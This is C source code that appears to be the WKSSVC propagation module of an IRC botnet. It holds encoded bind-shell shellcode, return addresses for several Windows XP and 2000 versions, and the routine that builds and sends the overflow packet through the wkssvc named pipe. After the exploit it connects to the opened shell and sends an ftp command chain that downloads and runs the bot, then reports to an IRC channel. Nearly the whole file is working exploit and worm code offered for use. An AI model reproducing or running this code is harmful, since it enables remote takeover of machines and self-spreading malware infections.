#ifndef NO_WKSSVC

#include "../header/includes.h"
#include "../header/functions.h"
#include "../header/externs.h"
#include "../header/random.h"

#define snprintf _snprintf
bool success = false;
unsigned char szStack[]	= "\x66\x81\xec\xd0\x07"; // sub sp, 7d0h

unsigned char szWKSSVCUnknown1[] = "\x74\x9f\x12\x00";
unsigned char szWKSSVCUnknown2[] = "\x78\x7d\x12\x00";

unsigned char szDecoder[] =
"\x60\xeb\x03\x5b\x53\xc3\xe8\xf8\xff\xff\xff\x31\xc0\x04\x34\x01"
"\xd8\x50\x5b\x31\xd2\x02\x10\x40\x02\x30\x40\x50\x31\xc0\x04\x41"
"\x28\xc2\x28\xc6\xc0\xe2\x04\x66\xc1\xea\x04\x31\xc0\x30\xf6\x02"
"\x03\x28\x03\x66\x01\x13\x43\x58\x31\xc9\x02\x08\xe0\xd5\x61";

char wksshell[] =
"\x29\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x64"
"\x09\x05\x62\x83\xeb\xfc\xe2\xf4\x98\x63\xee\x2f\x8c\xf0\xfa\x9d"
"\x9b\x69\x8e\x0e\x40\x2d\x8e\x27\x58\x82\x79\x67\x1c\x08\xea\xe9"
"\x2b\x11\x8e\x3d\x44\x08\xee\x2b\xef\x3d\x8e\x63\x8a\x38\xc5\xfb"
"\xc8\x8d\xc5\x16\x63\xc8\xcf\x6f\x65\xcb\xee\x96\x5f\x5d\x21\x4a"
"\x11\xec\x8e\x3d\x40\x08\xee\x04\xef\x05\x4e\xe9\x3b\x15\x04\x89"
"\x67\x25\x8e\xeb\x08\x2d\x19\x03\xa7\x38\xde\x06\xef\x4a\x35\xe9"
"\x24\x05\x8e\x12\x78\xa4\x8e\x22\x6c\x57\x6d\xec\x2a\x07\xe9\x32"
"\x9b\xdf\x63\x31\x02\x61\x36\x50\x0c\x7e\x76\x50\x3b\x5d\xfa\xb2"
"\x0c\xc2\xe8\x9e\x5f\x59\xfa\xb4\x3b\x80\xe0\x04\xe5\xe4\x0d\x60"
"\x31\x63\x07\x9d\xb4\x61\xdc\x6b\x91\xa4\x52\x9d\xb2\x5a\x56\x31"
"\x37\x5a\x46\x31\x27\x5a\xfa\xb2\x02\x61\x5e\xf8\x02\x5a\x8c\x83"
"\xf1\x61\xa1\x78\x14\xce\x52\x9d\xb2\x63\x15\x33\x31\xf6\xd5\x0a"
"\xc0\xa4\x2b\x8b\x33\xf6\xd3\x31\x31\xf6\xd5\x0a\x81\x40\x83\x2b"
"\x33\xf6\xd3\x32\x30\x5d\x50\x9d\xb4\x9a\x6d\x85\x1d\xcf\x7c\x35"
"\x9b\xdf\x50\x9d\xb4\x6f\x6f\x06\x02\x61\x66\x0f\xed\xec\x6f\x32"
"\x3d\x20\xc9\xeb\x83\x63\x41\xeb\x86\x38\xc5\x91\xce\xf7\x47\x4f"
"\x9a\x4b\x29\xf1\xe9\x73\x3d\xc9\xcf\xa2\x6d\x10\x9a\xba\x13\x9d"
"\x11\x4d\xfa\xb4\x3f\x5e\x57\x33\x35\x58\x6f\x63\x35\x58\x50\x33"
"\x9b\xd9\x6d\xcf\xbd\x0c\xcb\x31\x9b\xdf\x6f\x9d\x9b\x3e\xfa\xb2"
"\xef\x5e\xf9\xe1\xa0\x6d\xfa\xb4\x36\xf6\xd5\x0a\x94\x83\x01\x3d"
"\x37\xf6\xd3\x9d\xb4\x09\x05\x62";

// ---

typedef struct
{
	const char* pszName;
	unsigned long nNewEIP;						// memory offset of the new EIP (0 character bytes are not possible and the forbidden characters of your and the target codepage)
	unsigned long nNewEIP_BufferOffset;			// offset in the exploits buffer for nNewEIP
	bool bCanUse_NetAddAlternateComputerName;	// can use the NetAddAlternateComputerName function YES/NO
} Target;
Target Targets[] =
{
	{ "Windows XP SP0+1 GER+NL+IT+FR",	0x77bd3143, 2044, true  }, // version.dll, call edi
	{ "Windows XP SP0+1 ENG",			0x77c03143, 2044, true  }, // version.dll, call edi
	{ "Windows 2000 SP4 GER FAT32",		0x655b4f02, 2023, false },
	{ "DoS XP ALL",						0x41414141, 2044, true  },
};

#pragma pack( 1 )
typedef unsigned char UINT8;
typedef unsigned short UINT16;
typedef unsigned int UINT32;

typedef struct
{
	UINT32 maxlength;
	UINT32 unknown;
	UINT32 length;
} UNISTR2;
typedef struct
{
	UINT8 versionmaj;
	UINT8 versionmin;
	UINT8 type;
	UINT8 flags;
	UINT32 representation;
	UINT16 fraglength;
	UINT16 authlength;
	UINT32 callid;
} RPC_Header;
typedef struct
{
	UINT8 byte[16];
	UINT32 version;
} RPC_Iface;
typedef struct
{
	RPC_Header NormalHeader;

	UINT16 maxtsize;
	UINT16 maxrsize;
	UINT32 assocgid;
	UINT32 numelements;
	UINT16 contextid;
	UINT8 numsyntaxes;

	UINT8 align; // 4 byte align

	RPC_Iface Interface1;
	RPC_Iface Interface2;
} RPC_ReqBind;
typedef struct
{
	RPC_Header NormalHeader;

	UINT32 allochint;
	UINT16 prescontext;
	UINT16 opnum;
} RPC_ReqNorm;
#pragma pack()
// ---

////////////////////////////////////////////////////////////////
bool SendReqPacket_Part( HANDLE hPipe, RPC_ReqNorm pPacketHeader, unsigned char *pStubData, unsigned long nDataLen, unsigned long nMaxSize, bool bFirst )
{
	bool bSendNext;
	unsigned char *pPacket;
	unsigned long nBytesWritten;

	// first fragment
	if( bFirst )
		pPacketHeader.NormalHeader.flags |= 1; // first fragment
	else
		pPacketHeader.NormalHeader.flags &= ~1; // not first fragment

	if( ( nDataLen + sizeof( RPC_ReqNorm ) ) <= nMaxSize )
	{
		// last
		pPacketHeader.NormalHeader.fraglength	= (unsigned short)( nDataLen + sizeof( RPC_ReqNorm ) );
		pPacketHeader.allochint					= nDataLen;
		pPacketHeader.NormalHeader.flags		|= 2; // last fragment

		bSendNext = false;
	}
	else
	{
		// not last fragment
		pPacketHeader.NormalHeader.fraglength	= (unsigned short)nMaxSize;
		pPacketHeader.allochint					= nMaxSize - sizeof( RPC_ReqNorm );
		pPacketHeader.NormalHeader.flags		&= ~2; // not last fragment

		bSendNext = true;
	}

	// alloc packet
	pPacket = (unsigned char*)malloc( pPacketHeader.NormalHeader.fraglength );
	if( !pPacket )
		return false;

	// make packet
	*(RPC_ReqNorm*)pPacket = pPacketHeader; // copy header
	memcpy( &pPacket[ sizeof( RPC_ReqNorm ) ], pStubData, pPacketHeader.allochint ); // add stub data

	// send
	if( !WriteFile( hPipe, pPacket, pPacketHeader.NormalHeader.fraglength, &nBytesWritten, NULL ) )
	{
		free( pPacket );
		return false;
	}
	free( pPacket );

	// send remaining
	if( bSendNext )
		return SendReqPacket_Part( hPipe, pPacketHeader, &pStubData[ pPacketHeader.allochint ], nDataLen - pPacketHeader.allochint, nMaxSize, false );
	else
		return true;
}

BOOL ScriptGod_WKSSVC( unsigned long nTargetID, EXINFO exinfo )
{
	int TargetOS;

	// =============================
	char* pszTarget;
	// ---
	int len;
	SOCKET sockfd;
	SOCKADDR_IN shell_addr;
	memset(&shell_addr, 0, sizeof(shell_addr));

	char szNetbiosTarget[ 8192 ];
	wchar_t wszNetbiosTarget[ 8192 ];
	unsigned char szExploitsData[ 3500 ];
	unsigned long nExploitsDataPos;
	wchar_t wszExploitsData[ sizeof( szExploitsData ) ];
	// ---
	char szIPC[ 8192 ];
	NETRESOURCE NetSource;
	// ---
	char szPipe[ 8192 ];
	HANDLE hPipe;
	// ---
	RPC_ReqBind BindPacket;
	unsigned long nBytesWritten;
	RPC_ReqNorm ReqNormalHeader;
	unsigned long nPacketSize;
	unsigned char* pPacket;
	unsigned long nPacketPos;
	// ============================

	// check if xp
	TargetOS = FpHost( exinfo.ip, FP_RPC );
	if( TargetOS != OS_WINXP )
		return FALSE;
				 else {
				 success = TRUE; }

	// parameters
	pszTarget = exinfo.ip;


	// generate exploits buffer
	// ========================
	memset( szExploitsData, 0, sizeof( szExploitsData ) );
	memset( wszExploitsData, 0, sizeof( wszExploitsData ) );

	// fill with NOPs (using inc ecx instead of NOP, 0-terminated-string)
	memset( szExploitsData, 'A', sizeof( szExploitsData ) - 1 );

	// new EIP
	*(unsigned long*)( &szExploitsData[ Targets[ nTargetID ].nNewEIP_BufferOffset ] ) = Targets[ nTargetID ].nNewEIP;

	// some NOPs
	nExploitsDataPos = 2300;

	// add stack
	memcpy( &szExploitsData[ nExploitsDataPos ], szStack, sizeof( szStack ) - 1 );
	nExploitsDataPos += sizeof( szStack ) - 1;

	// add decoder
	memcpy( &szExploitsData[ nExploitsDataPos ], szDecoder, sizeof( szDecoder ) - 1 );
	nExploitsDataPos += sizeof( szDecoder ) - 1;

	// add shellcode
	// - bind port
	// - encode
	// - add
	memcpy( &szExploitsData[ nExploitsDataPos ], wksshell, strlen( (char*)wksshell ) );
	nExploitsDataPos += strlen( (char*)wksshell );
	// - 0 terminaten for decoder
	szExploitsData[ nExploitsDataPos ] = 0;
	nExploitsDataPos += 1;

	// convert to UNICODE
	// ==================
	for( int n = 0; n < sizeof( szExploitsData ); n++ )
		wszExploitsData[ n ] = szExploitsData[ n ];
	//MultiByteToWideChar( CP_ACP, 0, (char*)szExploitsData, -1, wszExploitsData, sizeof( wszExploitsData ) / sizeof( wchar_t ) );
	snprintf( szNetbiosTarget, sizeof( szNetbiosTarget ), "\\\\%s", pszTarget );
	mbstowcs( wszNetbiosTarget, szNetbiosTarget, sizeof( wszNetbiosTarget ) / sizeof( wchar_t ) );

	// create NULL session
	// ===================
	if( strcmpi( pszTarget, "." ) )
	{
		snprintf( szIPC, sizeof( szIPC ), "\\\\%s\\ipc$", pszTarget );
		memset( &NetSource, 0 ,sizeof( NetSource ) );
		NetSource.lpRemoteName = szIPC;
		fWNetAddConnection2( &NetSource, "", "", 0 );
	}
	// ===================

	// connect to pipe
	// ===============
	snprintf( szPipe, sizeof( szPipe ), "\\\\%s\\pipe\\wkssvc", pszTarget );
	hPipe = CreateFile( szPipe, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL );
	if( hPipe == INVALID_HANDLE_VALUE )
	{
		fWNetCancelConnection2( NetSource.lpRemoteName, 0, FALSE );
		return FALSE;
	}
	// ===============

	// bind packet
	// ===========
	memset( &BindPacket, 0, sizeof( BindPacket ) );
	BindPacket.NormalHeader.versionmaj		= 5;
	BindPacket.NormalHeader.versionmin		= 0;
	BindPacket.NormalHeader.type			= 11;	// bind
	BindPacket.NormalHeader.flags			= 3;	// first + last fragment
	BindPacket.NormalHeader.representation	= 0x00000010; // little endian
	BindPacket.NormalHeader.fraglength		= sizeof( BindPacket );
	BindPacket.NormalHeader.authlength		= 0;
	BindPacket.NormalHeader.callid			= 1;
	BindPacket.maxtsize						= 4280;
	BindPacket.maxrsize						= 4280;
	BindPacket.assocgid						= 0;
	BindPacket.numelements					= 1;
	BindPacket.contextid					= 0;
	BindPacket.numsyntaxes					= 1;
	BindPacket.Interface1.version			= 1;
	memcpy( BindPacket.Interface1.byte, "\x98\xd0\xff\x6b\x12\xa1\x10\x36\x98\x33\x46\xc3\xf8\x7e\x34\x5a", 16 );
	BindPacket.Interface2.version			= 2;
	memcpy( BindPacket.Interface2.byte, "\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00\x2b\x10\x48\x60", 16 );

	// send
	if( !WriteFile( hPipe, &BindPacket, sizeof( RPC_ReqBind ), &nBytesWritten, NULL ) )
	{
		CloseHandle( hPipe );
		fWNetCancelConnection2( NetSource.lpRemoteName, 0, FALSE );
		return FALSE;
	}
	// ===========

	// request
	// =======
	// generate packet
	// ---------------

	// calc packet size
	nPacketSize = 0;
	nPacketSize += sizeof( szWKSSVCUnknown1 ) - 1;
	nPacketSize += sizeof( UNISTR2 );
	nPacketSize += ( wcslen( wszNetbiosTarget ) + 1 ) * sizeof( wchar_t );
	while( nPacketSize % 4 )
		nPacketSize++;
	if( Targets[ nTargetID ].bCanUse_NetAddAlternateComputerName )
		nPacketSize += sizeof( szWKSSVCUnknown2 ) - 1;
	nPacketSize += sizeof( UNISTR2 );
	nPacketSize += ( wcslen( wszExploitsData ) + 1 ) * sizeof( wchar_t );
	while( nPacketSize % 4 )
		nPacketSize++;
	nPacketSize += 8; // szWSSKVCUnknown3
	if( Targets[ nTargetID ].bCanUse_NetAddAlternateComputerName )
		nPacketSize += 4; // NetAddAlternateComputerName = reserved
	else
		nPacketSize += 2; // NetValidateName = NameType

	// alloc packet
	pPacket = (unsigned char*)malloc( nPacketSize );
	if( !pPacket )
	{
		CloseHandle( hPipe );
		fWNetCancelConnection2( NetSource.lpRemoteName, 0, FALSE );
		return FALSE;
	}
	memset( pPacket, 0, nPacketSize );

	// build packet
	nPacketPos = 0;

	// - szWKSSVCUnknown1
	memcpy( &pPacket[ nPacketPos ], szWKSSVCUnknown1, sizeof( szWKSSVCUnknown1 ) - 1 );
	nPacketPos += sizeof( szWKSSVCUnknown1 ) - 1;

	// - wszNetbiosTarget
	( (UNISTR2*)&pPacket[ nPacketPos ] )->length	= wcslen( wszNetbiosTarget ) + 1;
	( (UNISTR2*)&pPacket[ nPacketPos ] )->unknown	= 0;
	( (UNISTR2*)&pPacket[ nPacketPos ] )->maxlength	= ( (UNISTR2*)&pPacket[ nPacketPos ] )->length;
	nPacketPos += sizeof( UNISTR2 );

	wcscpy( (wchar_t*)&pPacket[ nPacketPos ], wszNetbiosTarget );
	nPacketPos += ( wcslen( wszNetbiosTarget ) + 1 ) * sizeof( wchar_t );

	// - align
	while( nPacketPos % 4 )
		nPacketPos++;

	// - szWKSSVCUnknown2
	if( Targets[ nTargetID ].bCanUse_NetAddAlternateComputerName )
	{
		memcpy( &pPacket[ nPacketPos ], szWKSSVCUnknown2, sizeof( szWKSSVCUnknown2 ) - 1 );
		nPacketPos += sizeof( szWKSSVCUnknown2 ) - 1;
	}

	// - wszExploitsData
	( (UNISTR2*)&pPacket[ nPacketPos ] )->length	= wcslen( wszExploitsData ) + 1;
	( (UNISTR2*)&pPacket[ nPacketPos ] )->unknown	= 0;
	( (UNISTR2*)&pPacket[ nPacketPos ] )->maxlength	= ( (UNISTR2*)&pPacket[ nPacketPos ] )->length;
	nPacketPos += sizeof( UNISTR2 );

	wcscpy( (wchar_t*)&pPacket[ nPacketPos ], wszExploitsData );
	nPacketPos += ( wcslen( wszExploitsData ) + 1 ) * sizeof( wchar_t );

	// - align
	while( nPacketPos % 4 )
		nPacketPos++;

	// - szWSSKVCUnknown3 (only eigth 0x00s)
	memset( &pPacket[ nPacketPos ], 0, 8 );
	nPacketPos += 8;

	if( Targets[ nTargetID ].bCanUse_NetAddAlternateComputerName )
	{
		// NetAddAlternateComputerName = 0
		*(DWORD*)&pPacket[ nPacketPos ] = 0;
		nPacketPos += sizeof( DWORD );
	}
	else
	{
		// NetValidateName = NetSetupMachine
		*(unsigned short*)&pPacket[ nPacketPos ] = 1;
		nPacketPos += 2;
	}




	// header
	memset( &ReqNormalHeader, 0, sizeof( ReqNormalHeader ) );
	ReqNormalHeader.NormalHeader.versionmaj		= 5;
	ReqNormalHeader.NormalHeader.versionmin		= 0;
	ReqNormalHeader.NormalHeader.type			= 0;	// request
	ReqNormalHeader.NormalHeader.flags			= 3;	// first + last fragment
	ReqNormalHeader.NormalHeader.representation	= 0x00000010; // little endian
	ReqNormalHeader.NormalHeader.authlength		= 0;
	ReqNormalHeader.NormalHeader.callid			= 1;
	ReqNormalHeader.prescontext					= 0;
	if( Targets[ nTargetID ].bCanUse_NetAddAlternateComputerName )
		ReqNormalHeader.opnum					= 27;	// NetrAddAlternateComputerName
	else
		ReqNormalHeader.opnum					= 25;	// NetrValidateName2
	// send
	if( !SendReqPacket_Part( hPipe, ReqNormalHeader, pPacket, nPacketSize, 4280, true ) )
	{
		CloseHandle( hPipe );
		free( pPacket );
		fWNetCancelConnection2( NetSource.lpRemoteName, 0, FALSE );
		return FALSE;
	}
	// =======

	// clean up
	// =================;
	CloseHandle( hPipe );
	free( pPacket );
	fWNetCancelConnection2( NetSource.lpRemoteName, 0, FALSE );

	char recvbuf[1024];

	shell_addr.sin_family = AF_INET;
	shell_addr.sin_addr.s_addr = finet_addr(exinfo.ip); // = *((LPIN_ADDR) * lpHostEntry->h_addr_list);
	shell_addr.sin_port = fhtons(23450);;

	if ((sockfd = fsocket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET )
		return false;
	if (fconnect(sockfd, (LPSOCKADDR)&shell_addr, sizeof(shell_addr)) == SOCKET_ERROR)
		return false;

	char mkdir_buff[400];

	len = frecv(sockfd, recvbuf, 1024, 0);

_snprintf(mkdir_buff, sizeof (mkdir_buff),"echo open %s %s>> eeul.txt &echo user 1 1 >> eeul.txt &echo binary >> eeul.txt&echo get %s >> eeul.txt&echo quit >> eeul.txt&ftp.exe -n -s:eeul.txt&del eeul.txt&%s\n",GetIP(exinfo.sock),FTP_PORT,filename,filename);

    if (fsend(sockfd, mkdir_buff, strlen(mkdir_buff),0) == -1)
		return false;
	Sleep(500);
	_snprintf(mkdir_buff, sizeof (mkdir_buff), "%s\r\n", filename);


	if (fsend(sockfd, mkdir_buff, strlen(mkdir_buff),0) == -1)
		return false;
	len = frecv(sockfd, recvbuf, 1024, 0);

	fclosesocket(sockfd);

	if (success) {
	char buffer[ IRCLINE ];
	_snprintf(buffer, sizeof(buffer), "Trying: %s (%s)", exinfo.ip, exploit[exinfo.exploit].name);
	irc_privmsg(exinfo.sock, exinfo.chan, buffer, exinfo.notice);
	addlog(buffer);
	exploit[exinfo.exploit].stats++;
}
	return TRUE;
}







BOOL ScriptGod_WKSSVC_Eng( EXINFO einfo )
{
	BOOL bOK;

	// 2 times
	bOK = ScriptGod_WKSSVC( 1, einfo );
	if( !ScriptGod_WKSSVC( 1, einfo ) && !bOK )
		return FALSE;
	else
		return TRUE;
}

BOOL ScriptGod_WKSSVC_Other( EXINFO einfo )
{
	BOOL bOK;

	// 2 times
	bOK = ScriptGod_WKSSVC( 0, einfo );
	if( !ScriptGod_WKSSVC( 0, einfo ) && !bOK )
		return FALSE;
	else
		return TRUE;
}

#endif